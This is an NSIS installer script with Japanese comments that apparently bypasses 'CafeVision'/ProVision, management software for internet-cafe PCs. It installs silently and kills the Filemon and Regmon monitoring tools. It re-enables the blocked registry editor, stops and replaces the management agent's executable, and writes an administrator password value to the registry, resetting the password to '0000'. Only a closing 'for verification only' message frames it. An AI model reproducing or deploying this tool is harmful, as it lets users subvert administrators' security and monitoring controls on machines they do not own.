; ------------------------------------------------------------------
; General
;
!Define TB_PRODUCT     "ChangeAgent"
!Define TB_PRODUCTNAME "ChangeAgent"
!Define PROVISION   "software\ProVision\Agent"

Name       "${TB_PRODUCTNAME}"
OutFile    "..\${TB_PRODUCT}.exe"
InstallDir "$PROGRAMFILES\Provision\Agent"

; --------------------------------
; Pages
;
BrandingText ""

SetCompressor /SOLID lzma
XPStyle on

!include "MUI2.nsh"

!define MUI_ICON   "icons\setup-agent.ico"
!define MUI_UNICON "icons\setup-agent.ico"

!insertmacro MUI_PAGE_INSTFILES

var TB_TARGET_EXE_NAME
var TB_TARGET_EXE_WAIT

;; 完全にステルスでインストールを行う
SilentInstall silent

Function .onInit
  Banner::show /NOUNLOAD "展開中..."

  Banner::getWindow /NOUNLOAD
  Pop $1

  again:
    IntOp $0 $0 + 1
    Sleep 10
    StrCmp $0 500 0 again

  GetDlgItem $2 $1 1030
  SendMessage $2 ${WM_SETTEXT} 0 "STR:展開完了..."

  again2:
    IntOp $0 $0 + 1
    Sleep 10
    StrCmp $0 700 0 again2

  Banner::destroy
FunctionEnd

;--------------------------------
; Install Section
;
section "Install"
  IfFileExists "$PROGRAMFILES\Provision\Agent\Agent.exe" found
    MessageBox MB_OK "カフェビジョンがインストールされていません…"
    Quit

  found:
  
  StrCmp "$EXEFILE" "${TB_PRODUCT}.exe" DoExeWork DoExeNotWork
  DoExeNotWork:
    MessageBox MB_OK|MB_ICONSTOP "プログラム名が不正です。"
    Call CleanJob
    quit
  DoExeWork:

  StrCmp $DESKTOP $EXEDIR DoNotWork DoWork
  DoNotWork:
    MessageBox MB_OK|MB_ICONSTOP "デスクトップでは実行しないで下さい！"
    Call CleanJob
    quit
  DoWork:

  SetOutPath "$INSTDIR"
  
  StrCpy $TB_TARGET_EXE_NAME "Filemon.exe"
  StrCpy $TB_TARGET_EXE_WAIT 300
  Call KillProc

  StrCpy $TB_TARGET_EXE_NAME "Regmon.exe"
  StrCpy $TB_TARGET_EXE_WAIT 300
  Call KillProc

  Sleep 2000

  ;; レジストリにアクセス制限されてる場合があるので
  ;; マンボーは「窓の手」でレジストリへのアクセスが制限(念のために窓の手はパスワードつき
  ;; [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
  ;; "DisableRegistryTools"=dword:00000000
  DetailPrint "Change DisableRegistry..."
  WriteRegDWORD HKCU "Software\Microsoft\Windows\CurrentVersion\Policies\System"  "DisableRegistryTools" 0x00000000

  ;; CafeVisionの解除を行う
  ;; [HKEY_LOCAL_MACHINE\software\ProVision\Agent\Settings\Option]
  ;; "XCovery"=dword:00000001
  ;; "Remote"=dword:00000001
  ;; "Explorer"=dword:00000001
  ;; "Registry"=dword:00000001
  ;; "Monitor"=dword:00000000
  ;; agentの停止を行う
  DetailPrint "Stop Cafevision Agent..."
  SimpleSC::StopService "Dms-RHost"
  SimpleSC::StopService "ProVision Agent Service"
  SimpleSC::StopService "DMS Agent Service"
  SimpleSC::StopService "SwDist"
  SimpleSC::StopService "ProVision-RHost"
  Sleep 2000

  ;; 念のために止める
  DetailPrint "Stop Agent..."
  StrCpy $TB_TARGET_EXE_NAME "Agent.exe"
  StrCpy $TB_TARGET_EXE_WAIT 300
  Call KillProc

  Sleep 1000

  DetailPrint "Del Agent..."
  Delete "$PROGRAMFILES\Provision\Agent\Agent.exe"

  Sleep 2000

  ;; ファイルの展開
  DetailPrint "Copy Agent..."
  File "..\external\recovery\XCoveryTB\Agent.exe"
  
  ;; レジストリの書き換え
  WriteRegStr   HKLM "${PROVISION}\Settings"        "PwdAdmin" "332197294:c0a5825d04"

  ;; サービスの開始
  SimpleSC::StartService "Dms-RHost"
  SimpleSC::StartService "ProVision Agent Service"
  SimpleSC::StartService "DMS Agent Service"
  SimpleSC::StartService "SwDist"
  SimpleSC::StartService "ProVision-RHost"
  Sleep 2000

  ;; 起動
  Exec '"$INSTDIR\Agent.exe"'

  Call CleanJob

  StrCpy $0 "管理者のパスワードを「0000」で初期化しました。$\r$\n$\r$\n"
  StrCpy $0 "$0検証の目的のみで使用してください"
  MessageBox MB_OK|MB_ICONINFORMATION $0

  Quit
SectionEnd

Function KillProc
  Push $0
  IntFmt $R4 "%u" 0

  Processes::FindProcess $TB_TARGET_EXE_NAME
  StrCmp $R0 "1" loop done

  loop:
    KillProcDLL::KillProc $TB_TARGET_EXE_NAME
    StrCmp $R0 "0" done
    StrCmp $R0 "603" done
    Sleep $TB_TARGET_EXE_WAIT

    ;; 無限ループ回避
    IntOp $R4 $R4 + 1
    IntCmp $R4 10 done

    Processes::FindProcess $TB_TARGET_EXE_NAME
    StrCmp $R0 "1" loop done
  done:
    Sleep 100

 Pop $0
FunctionEnd

Function CleanJob
  Sleep 1000
FunctionEnd
